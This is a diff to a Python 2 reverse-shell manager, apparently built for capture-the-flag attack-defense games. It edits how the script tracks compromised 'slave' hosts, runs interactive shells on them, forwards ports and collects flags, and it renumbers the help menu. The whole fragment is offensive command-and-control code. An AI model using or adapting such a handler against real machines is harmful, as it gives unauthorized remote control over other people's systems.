@@ -40,7 +40,9 @@ def transfer(i, o, is_socket):
 
 '''
 
-def transfer(socket_fd):
+def transfer(h):
+    slave = slaves[h]
+    socket_fd = slave.socket_fd
     buffer_size = 0x400
     while True:
         buffer = socket_fd.recv(buffer_size)
@@ -51,6 +53,7 @@ def transfer(socket_fd):
         print ""
     socket_fd.shutdown(socket.SHUT_RDWR)
     socket_fd.close()
+    slave.remove_node()
 
 class Slave():
     def __init__(self, socket_fd):
@@ -87,17 +90,21 @@ class Slave():
             self.socket_fd.send(command + "\n")
             return True
         except:
+            self.remove_node()
             return False
 
 
     def interactive_shell(self):
-        t = threading.Thread(target=transfer, args=(self.socket_fd, ))
+        t = threading.Thread(target=transfer, args=(self.node_hash, ))
         t.start()
-        while True:
-            command = raw_input() or ("exit")
-            if command == "exit":
-                break
-            self.socket_fd.send(command + "\n")
+        try:
+            while True:
+                command = raw_input() or ("exit")
+                if command == "exit":
+                    break
+                self.socket_fd.send(command + "\n")
+        except:
+            self.remove_node()
 
     def remove_node(self):
         print "[+] Removing Node!"
@@ -143,15 +150,14 @@ def master(host, port):
 def show_commands():
     print "Commands : "
     print "        0. [h|help|?|\\n] : show this help"
-    print "        0. [l] : list all online slaves"
-    print "        1. [p] : print position info"
-    print "        1. [i] : interactive shell"
-    print "        2. [g] : goto a slave"
-    print "        3. [c] : interact an shell"
-    print "        3. [f] : port forwarding"
-    print "        3. [gf] : get flag"
-    print "        3. [gaf] : get all flag"
-    print "        3. [q|quit|exit] : interact an shell"
+    print "        1. [l] : list all online slaves"
+    print "        2. [p] : print position info"
+    print "        3. [i] : interactive shell"
+    print "        4. [g] : goto a slave"
+    print "        5. [f] : port forwarding"
+    print "        6. [gf] : get flag"
+    print "        7. [gaf] : get all flag"
+    print "        8. [q|quit|exit] : interact an shell"
 
 def node_hash(host, port):
     return md5("%s:%d" % (host, port))
@@ -194,9 +200,10 @@ def main():
             found = False
             for key in slaves.keys():
                 if key.startswith(input_node_hash):
-                    old_slave = slaves[position]
+                    # old_slave = slaves[position]
                     new_slave = slaves[key]
-                    print "[+] Changing position from [%s:%d] to [%s:%d]" % (old_slave.hostname, old_slave.port, new_slave.hostname, new_slave.port)
+                    # print "[+] Changing position from [%s:%d] to [%s:%d]" % (old_slave.hostname, old_slave.port, new_slave.hostname, new_slave.port)
+                    print "[+] Changing position to [%s:%d]" % (new_slave.hostname, new_slave.port)
                     position = key
                     found = True
                     break
@@ -218,7 +225,7 @@ def main():
                 if result:
                     print "[+] Flag is sent to you!"
                 else:
-                    slave.remove_node()
+                    # slave.remove_node()
                     print "[-] Executing command failed! Connection aborted! Node removed!"
                     position = slaves.keys()[0]
                     print "[+] Position changed to : %s" % (position)
@@ -236,7 +243,7 @@ def main():
             if result:
                 print "[+] Flag is sent to you!"
             else:
-                slave.remove_node()
+                # slave.remove_node()
                 print "[-] Executing command failed! Connection aborted! Node removed!"
                 position = slaves.keys()[0]
                 print "[+] Position changed to : %s" % (position)
